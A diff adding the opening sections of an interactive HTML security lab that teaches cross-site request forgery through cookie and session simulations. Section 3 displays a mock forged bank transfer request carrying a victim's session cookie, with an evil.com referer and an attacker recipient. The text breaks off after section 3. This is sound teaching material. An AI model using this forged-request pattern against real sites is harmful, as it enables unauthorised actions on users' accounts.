@@ -1,0 +1,1516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSRF Lab: Understanding Request Forgery Attacks</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:     #07090f;
+  --bg2:    #0c0f1a;
+  --bg3:    #111524;
+  --bg4:    #181c2e;
+  --bg5:    #1e2338;
+  --border: #252a40;
+  --border2:#2e3550;
+  --text:   #dde2f5;
+  --text2:  #8891b8;
+  --text3:  #454d70;
+  --blue:   #3b82f6;
+  --indigo: #6366f1;
+  --cyan:   #06b6d4;
+  --red:    #f43f5e;
+  --amber:  #f59e0b;
+  --green:  #10b981;
+  --purple: #a78bfa;
+  --mono:   'IBM Plex Mono', monospace;
+  --sans:   'Outfit', sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:16px;line-height:1.7;min-height:100vh;overflow-x:hidden;}
+
+/* GRID BACKGROUND */
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(59,130,246,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(59,130,246,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
+
+/* NAV */
+.nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(7,9,15,0.95);border-bottom:1px solid var(--border);backdrop-filter:blur(12px);padding:0 2rem;display:flex;align-items:center;justify-content:space-between;height:58px;}
+.nav-brand{font-family:var(--mono);font-size:13px;font-weight:600;color:var(--cyan);letter-spacing:0.08em;}
+.nav-brand span{color:var(--text3);}
+.nav-steps{display:flex;gap:3px;}
+.nav-step{width:26px;height:26px;border-radius:50%;border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:10px;font-family:var(--mono);color:var(--text3);cursor:pointer;transition:all 0.2s;}
+.nav-step.active{background:var(--cyan);border-color:var(--cyan);color:#000;font-weight:600;}
+.nav-step.done{background:rgba(6,182,212,0.12);border-color:rgba(6,182,212,0.4);color:var(--cyan);}
+.nav-step:hover:not(.active){border-color:var(--cyan);color:var(--cyan);}
+
+/* HERO */
+.hero{position:relative;z-index:1;padding:110px 2rem 80px;max-width:960px;margin:0 auto;text-align:center;}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--cyan);background:rgba(6,182,212,0.08);border:1px solid rgba(6,182,212,0.2);padding:5px 14px;border-radius:20px;margin-bottom:28px;letter-spacing:0.12em;}
+.hero-dot{width:6px;height:6px;background:var(--cyan);border-radius:50%;animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.5;transform:scale(0.8);}}
+.hero h1{font-size:clamp(2.2rem,5vw,3.8rem);font-weight:800;line-height:1.1;letter-spacing:-0.02em;margin-bottom:10px;}
+.hero h1 em{font-style:normal;color:var(--cyan);}
+.hero-sub{font-family:var(--mono);font-size:13px;color:var(--blue);letter-spacing:0.2em;margin-bottom:18px;text-transform:uppercase;}
+.hero p{color:var(--text2);font-size:17px;max-width:580px;margin:0 auto 40px;}
+.hero-cta{display:inline-flex;align-items:center;gap:10px;background:var(--cyan);color:#000;font-family:var(--mono);font-size:13px;font-weight:600;padding:12px 30px;border-radius:6px;border:none;cursor:pointer;transition:all 0.2s;letter-spacing:0.05em;}
+.hero-cta:hover{background:#22d3ee;transform:translateY(-2px);}
+.hero-stats{display:flex;justify-content:center;gap:50px;margin-top:56px;}
+.hero-stat-n{font-family:var(--mono);font-size:24px;font-weight:600;color:var(--cyan);}
+.hero-stat-l{font-size:12px;color:var(--text3);margin-top:2px;}
+.overview-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-top:48px;}
+.ov-card{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:14px 16px;cursor:pointer;transition:all 0.2s;text-align:left;}
+.ov-card:hover{border-color:var(--cyan);transform:translateY(-2px);}
+.ov-n{font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:4px;}
+.ov-t{font-size:13px;font-weight:600;color:var(--text);}
+
+/* SECTIONS */
+.section{position:relative;z-index:1;max-width:960px;margin:0 auto 80px;padding:0 2rem;display:none;}
+.section.active{display:block;}
+.sec-head{display:flex;align-items:flex-start;gap:18px;margin-bottom:32px;padding-bottom:20px;border-bottom:1px solid var(--border);}
+.sec-num{font-family:var(--mono);font-size:11px;color:var(--cyan);background:rgba(6,182,212,0.08);border:1px solid rgba(6,182,212,0.2);padding:4px 10px;border-radius:4px;white-space:nowrap;margin-top:3px;}
+.sec-title{font-size:1.9rem;font-weight:800;letter-spacing:-0.02em;line-height:1.2;}
+.sec-desc{color:var(--text2);font-size:14px;margin-top:5px;}
+
+/* CARDS */
+.card{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:22px;margin-bottom:18px;}
+.card-cyan{border-color:rgba(6,182,212,0.35);background:rgba(6,182,212,0.04);}
+.card-red{border-color:rgba(244,63,94,0.35);background:rgba(244,63,94,0.04);}
+.card-amber{border-color:rgba(245,158,11,0.35);background:rgba(245,158,11,0.04);}
+.card-green{border-color:rgba(16,185,129,0.35);background:rgba(16,185,129,0.04);}
+.card-blue{border-color:rgba(59,130,246,0.35);background:rgba(59,130,246,0.04);}
+.card-indigo{border-color:rgba(99,102,241,0.35);background:rgba(99,102,241,0.04);}
+.card-label{font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:12px;}
+.lbl-cyan{color:var(--cyan);}
+.lbl-red{color:var(--red);}
+.lbl-amber{color:var(--amber);}
+.lbl-green{color:var(--green);}
+.lbl-blue{color:var(--blue);}
+.lbl-indigo{color:var(--indigo);}
+
+/* TERMINAL */
+.term{background:#040508;border:1px solid var(--border2);border-radius:8px;overflow:hidden;}
+.term-bar{background:var(--bg4);padding:7px 14px;display:flex;align-items:center;gap:7px;border-bottom:1px solid var(--border);}
+.td{width:10px;height:10px;border-radius:50%;}
+.td-r{background:#ff5f56;}
+.td-y{background:#ffbd2e;}
+.td-g{background:#27c93f;}
+.term-body{padding:14px 18px;font-family:var(--mono);font-size:12px;line-height:1.9;}
+.tk{color:#79b8ff;}
+.tv{color:var(--cyan);}
+.ts{color:#e6c07b;}
+.tc{color:var(--text3);}
+.td2{color:var(--red);}
+.tok{color:var(--green);}
+
+/* BUTTONS */
+.btn{font-family:var(--mono);font-size:12px;padding:8px 18px;border-radius:5px;cursor:pointer;border:1px solid var(--border2);background:var(--bg4);color:var(--text);transition:all 0.15s;letter-spacing:0.04em;display:inline-flex;align-items:center;gap:6px;}
+.btn:hover{border-color:var(--cyan);color:var(--cyan);}
+.btn-primary{background:var(--cyan);color:#000;border-color:var(--cyan);font-weight:600;}
+.btn-primary:hover{background:#22d3ee;color:#000;}
+.btn-red{background:rgba(244,63,94,0.12);color:var(--red);border-color:rgba(244,63,94,0.35);}
+.btn-red:hover{background:rgba(244,63,94,0.22);}
+.btn-green{background:rgba(16,185,129,0.12);color:var(--green);border-color:rgba(16,185,129,0.35);}
+.btn-green:hover{background:rgba(16,185,129,0.22);}
+.btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px;}
+
+/* INPUTS */
+input[type=text],input[type=password],input[type=number],textarea,select{width:100%;background:#040508;border:1px solid var(--border2);border-radius:6px;color:var(--text);font-family:var(--mono);font-size:12px;padding:9px 13px;outline:none;transition:border-color 0.2s;}
+input:focus,textarea:focus,select:focus{border-color:var(--cyan);}
+textarea{resize:vertical;min-height:70px;}
+select{cursor:pointer;}
+.lbl{font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:5px;letter-spacing:0.08em;}
+
+/* CALLOUT */
+.callout{border-left:3px solid var(--cyan);background:rgba(6,182,212,0.06);padding:13px 17px;border-radius:0 8px 8px 0;margin:16px 0;font-size:15px;}
+.callout-red{border-left-color:var(--red);background:rgba(244,63,94,0.06);}
+.callout-amber{border-left-color:var(--amber);background:rgba(245,158,11,0.06);}
+.callout-green{border-left-color:var(--green);background:rgba(16,185,129,0.06);}
+
+/* SPLIT */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+@media(max-width:640px){.split{grid-template-columns:1fr;}}
+.grid3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;}
+
+/* BADGE */
+.badge{display:inline-flex;align-items:center;font-family:var(--mono);font-size:10px;padding:3px 8px;border-radius:3px;letter-spacing:0.05em;}
+.b-red{background:rgba(244,63,94,0.15);color:var(--red);border:1px solid rgba(244,63,94,0.25);}
+.b-green{background:rgba(16,185,129,0.15);color:var(--green);border:1px solid rgba(16,185,129,0.25);}
+.b-cyan{background:rgba(6,182,212,0.15);color:var(--cyan);border:1px solid rgba(6,182,212,0.25);}
+.b-amber{background:rgba(245,158,11,0.15);color:var(--amber);border:1px solid rgba(245,158,11,0.25);}
+.b-blue{background:rgba(59,130,246,0.15);color:var(--blue);border:1px solid rgba(59,130,246,0.25);}
+.b-indigo{background:rgba(99,102,241,0.15);color:var(--indigo);border:1px solid rgba(99,102,241,0.25);}
+
+/* PROGRESS */
+.prog-bar{background:var(--border);border-radius:10px;height:3px;overflow:hidden;margin:16px 0;}
+.prog-fill{height:100%;background:var(--cyan);transition:width 0.5s;border-radius:10px;}
+
+/* BROWSER MOCK */
+.browser{border:1px solid var(--border2);border-radius:10px;overflow:hidden;background:var(--bg3);}
+.browser-bar{background:var(--bg4);padding:8px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid var(--border);}
+.burl{flex:1;background:var(--bg);border:1px solid var(--border2);border-radius:20px;padding:4px 12px;font-family:var(--mono);font-size:10px;color:var(--text2);}
+.burl.secure{color:var(--green);}
+.burl.danger{color:var(--red);}
+.burl::before{content:'🔒 ';font-size:9px;}
+.burl.danger::before{content:'⚠ ';}
+.browser-body{padding:18px;font-size:14px;min-height:80px;}
+
+/* FLOW DIAGRAM */
+.flow-nodes{display:flex;align-items:center;gap:0;flex-wrap:wrap;margin:18px 0;}
+.fn{background:var(--bg4);border:1px solid var(--border2);border-radius:8px;padding:10px 16px;font-size:13px;text-align:center;min-width:110px;position:relative;}
+.fn.active-node{border-color:var(--cyan);color:var(--cyan);background:rgba(6,182,212,0.08);}
+.fn.danger-node{border-color:var(--red);color:var(--red);background:rgba(244,63,94,0.08);}
+.fn.safe-node{border-color:var(--green);color:var(--green);background:rgba(16,185,129,0.08);}
+.farrow{color:var(--text3);font-size:18px;padding:0 8px;flex-shrink:0;}
+.farrow.danger{color:var(--red);}
+
+/* CHECKLIST */
+.cklist{list-style:none;}
+.cklist li{display:flex;gap:10px;align-items:flex-start;padding:5px 0;font-size:14px;}
+.cklist li::before{content:'→';color:var(--cyan);font-family:var(--mono);font-size:12px;margin-top:2px;flex-shrink:0;}
+
+/* TABS */
+.tabs{display:flex;gap:2px;margin-bottom:18px;border-bottom:1px solid var(--border);}
+.tab{font-family:var(--mono);font-size:11px;padding:7px 15px;cursor:pointer;color:var(--text3);border-bottom:2px solid transparent;margin-bottom:-1px;transition:all 0.15s;border-radius:4px 4px 0 0;}
+.tab.active{color:var(--cyan);border-bottom-color:var(--cyan);}
+.tab:hover:not(.active){color:var(--text2);}
+.tab-panel{display:none;}
+.tab-panel.active{display:block;}
+
+/* CONDITION TOGGLE */
+.cond-toggle{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:var(--bg4);border:1px solid var(--border);border-radius:8px;margin-bottom:8px;cursor:pointer;transition:all 0.2s;}
+.cond-toggle:hover{border-color:var(--border2);}
+.cond-toggle.on{border-color:rgba(244,63,94,0.4);background:rgba(244,63,94,0.05);}
+.cond-toggle .cond-label{font-size:14px;}
+.cond-toggle .cond-status{font-family:var(--mono);font-size:11px;padding:3px 10px;border-radius:3px;transition:all 0.2s;}
+.cond-toggle.on .cond-status{background:rgba(244,63,94,0.15);color:var(--red);border:1px solid rgba(244,63,94,0.3);}
+.cond-toggle.off .cond-status{background:rgba(16,185,129,0.12);color:var(--green);border:1px solid rgba(16,185,129,0.25);}
+
+/* ATTACK RESULT */
+.attack-result{padding:16px;border-radius:8px;text-align:center;margin-top:12px;font-family:var(--mono);font-size:13px;}
+.atk-success{background:rgba(244,63,94,0.1);border:1px solid rgba(244,63,94,0.3);color:var(--red);}
+.atk-blocked{background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.3);color:var(--green);}
+
+/* MINDSET */
+.mindset-item{display:flex;gap:14px;align-items:flex-start;padding:13px;background:var(--bg4);border-radius:8px;border:1px solid var(--border);margin-bottom:9px;}
+.mi-q{font-weight:600;font-size:14px;color:var(--red);margin-bottom:3px;}
+.mi-a{font-size:13px;color:var(--text2);}
+
+/* COMPARISON TABLE */
+.cmp-table{width:100%;border-collapse:collapse;}
+.cmp-table th,.cmp-table td{padding:10px 14px;text-align:left;font-size:13px;border-bottom:1px solid var(--border);}
+.cmp-table th{font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:0.1em;}
+
+/* STEP INDICATOR */
+.steps{display:flex;gap:0;margin:20px 0;position:relative;}
+.steps::before{content:'';position:absolute;top:14px;left:14px;right:14px;height:1px;background:var(--border);z-index:0;}
+.step-item{flex:1;text-align:center;position:relative;z-index:1;}
+.step-dot{width:28px;height:28px;border-radius:50%;background:var(--bg4);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:10px;color:var(--text3);margin:0 auto 6px;}
+.step-item.active-step .step-dot{background:var(--cyan);border-color:var(--cyan);color:#000;font-weight:600;}
+.step-item.done-step .step-dot{background:rgba(6,182,212,0.15);border-color:rgba(6,182,212,0.4);color:var(--cyan);}
+.step-item.danger-step .step-dot{background:rgba(244,63,94,0.15);border-color:rgba(244,63,94,0.4);color:var(--red);}
+.step-lbl{font-size:11px;color:var(--text3);}
+.step-item.active-step .step-lbl{color:var(--cyan);}
+.step-item.danger-step .step-lbl{color:var(--red);}
+
+/* NAV BUTTONS */
+.nav-btns{display:flex;justify-content:space-between;align-items:center;margin-top:50px;padding-top:24px;border-bottom:1px solid var(--border);}
+
+/* TOKEN DEMO */
+.token-box{font-family:var(--mono);font-size:11px;background:#040508;border:1px solid var(--border2);border-radius:5px;padding:8px 12px;color:var(--cyan);word-break:break-all;margin:8px 0;}
+.token-box.invalid{color:var(--red);border-color:rgba(244,63,94,0.3);}
+
+/* ANIMATED COOKIE */
+@keyframes slide-right{from{transform:translateX(-20px);opacity:0;}to{transform:translateX(0);opacity:1;}}
+@keyframes slide-down{from{transform:translateY(-10px);opacity:0;}to{transform:translateY(0);opacity:1;}}
+.anim-in{animation:slide-right 0.4s ease both;}
+.anim-down{animation:slide-down 0.3s ease both;}
+
+/* LAB */
+.lab-task{padding:16px 20px;border-radius:8px;margin-bottom:12px;border:1px solid var(--border);background:var(--bg4);display:flex;gap:14px;align-items:flex-start;}
+.lab-task.completed{border-color:var(--green);background:rgba(16,185,129,0.04);}
+.lt-num{font-family:var(--mono);font-size:20px;font-weight:600;color:var(--text3);min-width:28px;}
+.lab-task.completed .lt-num{color:var(--green);}
+.lt-title{font-weight:600;margin-bottom:4px;font-size:15px;}
+.lt-hint{font-size:13px;color:var(--text2);}
+
+/* REQUEST PANEL */
+.req-panel{border:1px solid var(--border2);border-radius:8px;overflow:hidden;}
+.req-header{background:var(--bg4);padding:8px 14px;font-family:var(--mono);font-size:10px;color:var(--text3);border-bottom:1px solid var(--border);letter-spacing:0.08em;}
+.req-body{padding:12px 16px;font-family:var(--mono);font-size:12px;line-height:1.8;}
+
+/* PACKET ANIMATION */
+.packet-flow{position:relative;height:60px;margin:16px 0;overflow:hidden;}
+.packet{position:absolute;top:20px;left:0;background:var(--cyan);color:#000;font-family:var(--mono);font-size:10px;padding:4px 10px;border-radius:4px;font-weight:600;white-space:nowrap;}
+.packet.danger-packet{background:var(--red);color:#fff;}
+@keyframes flow{0%{left:0;opacity:0;}10%{opacity:1;}90%{opacity:1;}100%{left:calc(100% - 120px);opacity:0;}}
+.packet.flowing{animation:flow 2s ease-in-out forwards;}
+
+/* SESSION STORE */
+.session-store{background:#040508;border:1px solid var(--border2);border-radius:6px;padding:10px 14px;font-family:var(--mono);font-size:11px;min-height:40px;}
+.session-entry{display:flex;gap:8px;align-items:center;padding:2px 0;}
+.se-key{color:var(--text3);}
+.se-val{color:var(--cyan);}
+
+/* SCENARIO CARD */
+.scenario-card{background:var(--bg4);border:1px solid var(--border);border-radius:8px;padding:16px;cursor:pointer;transition:all 0.2s;margin-bottom:10px;}
+.scenario-card:hover{border-color:var(--cyan);}
+.scenario-card.active-scenario{border-color:var(--red);background:rgba(244,63,94,0.04);}
+.sc-title{font-weight:600;margin-bottom:4px;}
+.sc-desc{font-size:13px;color:var(--text2);}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="nav">
+  <div class="nav-brand">CSRF_LAB <span>v2.0</span></div>
+  <div class="nav-steps" id="navSteps"></div>
+</nav>
+
+<!-- HERO -->
+<div class="hero" id="heroSection">
+  <div class="hero-eyebrow"><div class="hero-dot"></div>INTERACTIVE SECURITY LAB</div>
+  <h1>CSRF Lab: <em>Request Forgery</em> Attacks</h1>
+  <div class="hero-sub">Trusted Browser · Untrusted Actions</div>
+  <p>Understand how browsers handle authentication, how CSRF attacks exploit browser trust, and how to stop them.</p>
+  <button class="hero-cta" onclick="startLab()"><span>▶</span> BEGIN LAB</button>
+  <div class="hero-stats">
+    <div class="hero-stat"><div class="hero-stat-n">10</div><div class="hero-stat-l">Sections</div></div>
+    <div class="hero-stat"><div class="hero-stat-n">12+</div><div class="hero-stat-l">Simulations</div></div>
+    <div class="hero-stat"><div class="hero-stat-n">4</div><div class="hero-stat-l">Lab Tasks</div></div>
+  </div>
+  <div class="overview-grid">
+    <div class="ov-card" onclick="goToSection(1)"><div class="ov-n">01</div><div class="ov-t">Authentication & Cookies</div></div>
+    <div class="ov-card" onclick="goToSection(2)"><div class="ov-n">02</div><div class="ov-t">Browser Cookie Behavior</div></div>
+    <div class="ov-card" onclick="goToSection(3)"><div class="ov-n">03</div><div class="ov-t">The Core Problem</div></div>
+    <div class="ov-card" onclick="goToSection(4)"><div class="ov-n">04</div><div class="ov-t">What is CSRF</div></div>
+    <div class="ov-card" onclick="goToSection(5)"><div class="ov-n">05</div><div class="ov-t">Attack Flow Diagram</div></div>
+    <div class="ov-card" onclick="goToSection(6)"><div class="ov-n">06</div><div class="ov-t">Live Attack Simulation</div></div>
+    <div class="ov-card" onclick="goToSection(7)"><div class="ov-n">07</div><div class="ov-t">Conditions for CSRF</div></div>
+    <div class="ov-card" onclick="goToSection(8)"><div class="ov-n">08</div><div class="ov-t">CSRF vs XSS</div></div>
+    <div class="ov-card" onclick="goToSection(9)"><div class="ov-n">09</div><div class="ov-t">Prevention Techniques</div></div>
+    <div class="ov-card" onclick="goToSection(10)"><div class="ov-n">10</div><div class="ov-t">Final Hands-on Lab</div></div>
+  </div>
+</div>
+
+<!-- SECTION 1: AUTHENTICATION -->
+<div class="section" id="section-1">
+  <div class="sec-head">
+    <div class="sec-num">01 / 10</div>
+    <div><div class="sec-title">How Authentication Works</div><div class="sec-desc">Sessions, cookies, and how servers identify you</div></div>
+  </div>
+
+  <div class="callout">
+    When you log in to a website, the server creates a <strong>session</strong> and gives your browser a <strong>session cookie</strong>. Every future request includes this cookie — that's how the server knows who you are.
+  </div>
+
+  <div class="card">
+    <div class="card-label lbl-cyan">LOGIN SIMULATION</div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:16px;">Watch what happens step-by-step when a user logs in:</p>
+    <div class="split">
+      <div>
+        <div class="lbl">USERNAME</div>
+        <input type="text" id="loginUser" value="alice" style="margin-bottom:10px;">
+        <div class="lbl">PASSWORD</div>
+        <input type="password" id="loginPass" value="secret123" style="margin-bottom:12px;">
+        <button class="btn btn-primary" onclick="simulateLogin()">▶ Log In</button>
+      </div>
+      <div>
+        <div class="lbl">BROWSER COOKIE STORE</div>
+        <div class="session-store" id="cookieStore">
+          <div style="color:var(--text3);font-size:11px;">— no cookies yet —</div>
+        </div>
+        <div class="lbl" style="margin-top:10px;">SERVER SESSION</div>
+        <div class="session-store" id="serverSession">
+          <div style="color:var(--text3);font-size:11px;">— no active session —</div>
+        </div>
+      </div>
+    </div>
+    <div id="loginSteps" style="margin-top:16px;"></div>
+  </div>
+
+  <div class="card card-cyan">
+    <div class="card-label lbl-cyan">HOW COOKIES WORK</div>
+    <div class="flow-nodes">
+      <div class="fn safe-node">User logs in</div>
+      <div class="farrow">→</div>
+      <div class="fn">Server creates session</div>
+      <div class="farrow">→</div>
+      <div class="fn">Sends Set-Cookie header</div>
+      <div class="farrow">→</div>
+      <div class="fn active-node">Browser stores cookie</div>
+    </div>
+    <div class="term" style="margin-top:14px;">
+      <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:8px;">HTTP response headers</span></div>
+      <div class="term-body">
+        <div><span class="tk">HTTP/1.1</span> <span class="tok">200 OK</span></div>
+        <div><span class="tk">Set-Cookie:</span> <span class="tv">session=a1b2c3d4e5f6;</span> <span class="ts">Path=/; HttpOnly</span></div>
+        <div class="tc" style="margin-top:6px;">// Browser stores this cookie for bank.com</div>
+        <div class="tc">// Cookie is automatically sent with future requests</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card card-blue">
+    <div class="card-label lbl-blue">KEY POINT</div>
+    <p style="font-size:15px;">The cookie is the server's way of saying <strong>"I know who you are."</strong> As long as the cookie is valid, the server trusts every request that carries it.</p>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="goHome()">← Home</button>
+    <button class="btn btn-primary" onclick="nextSection(1)">Next: Browser Behavior →</button>
+  </div>
+</div>
+
+<!-- SECTION 2: BROWSER BEHAVIOR -->
+<div class="section" id="section-2">
+  <div class="sec-head">
+    <div class="sec-num">02 / 10</div>
+    <div><div class="sec-title">Browser Cookie Behavior</div><div class="sec-desc">Why the browser always sends cookies — silently</div></div>
+  </div>
+
+  <div class="callout">
+    <strong>Critical rule:</strong> Browsers automatically attach cookies to every request made to the matching domain — regardless of which website triggered the request.
+  </div>
+
+  <div class="card">
+    <div class="card-label lbl-cyan">ANIMATED REQUEST FLOW</div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:14px;">Watch how cookies are automatically attached to requests:</p>
+
+    <div class="browser" style="margin-bottom:14px;">
+      <div class="browser-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><div class="burl secure">bank.com/dashboard</div></div>
+      <div class="browser-body" id="s2BrowserBody">
+        <div style="font-size:14px;color:var(--text2);">Alice is logged in to Bank. Her browser holds the session cookie.</div>
+        <div class="session-store" style="margin-top:10px;font-size:11px;">
+          <div class="session-entry"><span class="se-key">bank.com cookie:</span><span class="se-val" id="s2Cookie">session=a1b2c3; user=alice</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="steps" id="s2Steps">
+      <div class="step-item" id="ss0"><div class="step-dot">1</div><div class="step-lbl">Trigger</div></div>
+      <div class="step-item" id="ss1"><div class="step-dot">2</div><div class="step-lbl">Build Req</div></div>
+      <div class="step-item" id="ss2"><div class="step-dot">3</div><div class="step-lbl">Attach Cookie</div></div>
+      <div class="step-item" id="ss3"><div class="step-dot">4</div><div class="step-lbl">Send</div></div>
+      <div class="step-item" id="ss4"><div class="step-dot">5</div><div class="step-lbl">Server Accepts</div></div>
+    </div>
+
+    <div class="packet-flow" id="s2PacketFlow">
+      <div style="position:absolute;left:0;top:8px;font-family:var(--mono);font-size:10px;color:var(--text3);">Browser</div>
+      <div style="position:absolute;right:0;top:8px;font-family:var(--mono);font-size:10px;color:var(--text3);">bank.com server</div>
+      <div id="s2Packet" class="packet" style="display:none;">GET /account + 🍪 session=a1b2c3</div>
+    </div>
+
+    <div id="s2Log" class="term" style="margin-top:0;">
+      <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:8px;">request log</span></div>
+      <div class="term-body tc" id="s2LogBody">— click step to animate —</div>
+    </div>
+    <div class="btn-row">
+      <button class="btn btn-primary" onclick="animateFlow(0)">▶ Step 1: Trigger</button>
+      <button class="btn" onclick="animateFlow(1)">Step 2: Build</button>
+      <button class="btn" onclick="animateFlow(2)">Step 3: Cookie Added</button>
+      <button class="btn" onclick="animateFlow(3)">Step 4: Send</button>
+      <button class="btn btn-green" onclick="animateFlow(4)">Step 5: Accepted</button>
+      <button class="btn" onclick="resetFlow()">Reset</button>
+    </div>
+  </div>
+
+  <div class="card card-amber">
+    <div class="card-label lbl-amber">THE SILENT PROBLEM</div>
+    <p style="font-size:14px;margin-bottom:12px;">The browser does this <em>automatically and silently</em> — you never see it happen. This is a feature for convenience, but it becomes a vulnerability when requests can be triggered by a third party.</p>
+    <div class="split">
+      <div style="padding:12px;background:var(--bg);border-radius:6px;border:1px solid rgba(16,185,129,0.2);">
+        <div style="font-family:var(--mono);font-size:10px;color:var(--green);margin-bottom:6px;">✓ INTENDED</div>
+        <div style="font-size:13px;color:var(--text2);">Alice clicks "Transfer Money" on bank.com → browser attaches cookie → server trusts Alice → transfer done</div>
+      </div>
+      <div style="padding:12px;background:var(--bg);border-radius:6px;border:1px solid rgba(244,63,94,0.2);">
+        <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:6px;">✗ EXPLOITABLE</div>
+        <div style="font-size:13px;color:var(--text2);">Attacker tricks Alice's browser into sending that same request → browser still attaches cookie → server still trusts → CSRF</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(2)">← Authentication</button>
+    <button class="btn btn-primary" onclick="nextSection(2)">Next: The Core Problem →</button>
+  </div>
+</div>
+
+<!-- SECTION 3: THE PROBLEM -->
+<div class="section" id="section-3">
+  <div class="sec-head">
+    <div class="sec-num">03 / 10</div>
+    <div><div class="sec-title">The Core Problem</div><div class="sec-desc">Identity vs. Intention — what servers actually check</div></div>
+  </div>
+
+  <div class="callout callout-red">
+    <strong>The fundamental flaw:</strong> The server checks <em>who</em> you are (via cookie), but never checks <em>if you intended</em> to make that request.
+  </div>
+
+  <div class="card">
+    <div class="card-label lbl-cyan">WHAT THE SERVER SEES</div>
+    <div class="split">
+      <div>
+        <div style="font-family:var(--mono);font-size:11px;color:var(--green);margin-bottom:10px;">REQUEST FROM ALICE (NORMAL)</div>
+        <div class="req-panel">
+          <div class="req-header">HTTP REQUEST — NORMAL</div>
+          <div class="req-body">
+            <div><span class="tk">POST</span> /transfer HTTP/1.1</div>
+            <div><span class="tk">Host:</span> <span class="tv">bank.com</span></div>
+            <div><span class="tk">Cookie:</span> <span class="ts">session=a1b2c3</span></div>
+            <div><span class="tk">Referer:</span> <span class="tv">https://bank.com</span></div>
+            <div style="margin-top:8px;"><span class="tk">amount=</span><span class="tv">100</span>&<span class="tk">to=</span><span class="tv">bob</span></div>
+          </div>
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:var(--green);">✓ Cookie valid → Request accepted</div>
+      </div>
+      <div>
+        <div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:10px;">FORGED REQUEST (CSRF ATTACK)</div>
+        <div class="req-panel" style="border-color:rgba(244,63,94,0.3);">
+          <div class="req-header" style="color:var(--red);">HTTP REQUEST — FORGED</div>
+          <div class="req-body">
+            <div><span class="tk">POST</span> /transfer HTTP/1.1</div>
+            <div><span class="tk">Host:</span> <span class="tv">bank.com</span></div>
+            <div><span class="tk">Cookie:</span> <span class="ts">session=a1b2c3</span> <span style="color:var(--red);">← same!</span></div>
+            <div><span class="tk">Referer:</span> <span class="td2">https://evil.com</span> <span style="color:var(--text3);">← different</span></div>
+            <div style="margin-top:8px;"><span class="tk">amount=</span><span class="td2">10000</span>&<span class="tk">to=</span><span class="td2">attacker</span></div>
+          </div>
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:var(--red);">✓ Cookie valid → Request ALSO accepted ← THE BUG</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card card-red">
+    <div class="card-label lbl-red">THE MISSING CHECK</div>
+    <div class="grid3">
+      <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid rgba(16,185,129,0.2);">
+        <div style="font-family:var(--mono);font-size:10px;color:var(--green);margin-bottom:8px;">✓ SERVER CHECKS</div>
+        <ul class="cklist">
+          <li>Is the cookie valid?</li>
+          <li>Is the session active?</li>
+          <li>Is the user authenticated?</li>
+        </ul>
+      </div>
+      <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid rgba(244,63,94,0.2);">
+        <div style="font-family:var(--mono);font-size:10px;color:var(--red);margin-bottom:8px;">✗ SERVER DOES NOT CHECK</div>
+        <ul class="cklist" style="--cyan: var(--red);">
+          <li>Did the user intend this?</li>
+          <li>Did user click a button?</li>
+          <li>Is request from trusted origin?</li>
+        </ul>
+      </div>
+      <div style="padding:14px;background:var(--bg);border-radius:8px;border:1px solid rgba(245,158,11,0.2);">
+        <div style="font-family:var(--mono);font-size:10px;color:var(--amber);margin-bottom:8px;">THE CONSEQUENCE</div>
+        <div style="font-size:13px;color:var(--text2);">An attacker who can trigger a browser request gets the same server trust as the legitimate user.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(3)">← Browser Behavior</button>
+    <button class="btn btn-primary" onclick="nextSection(3)">Next: What is CSRF →</button>
+  </div>
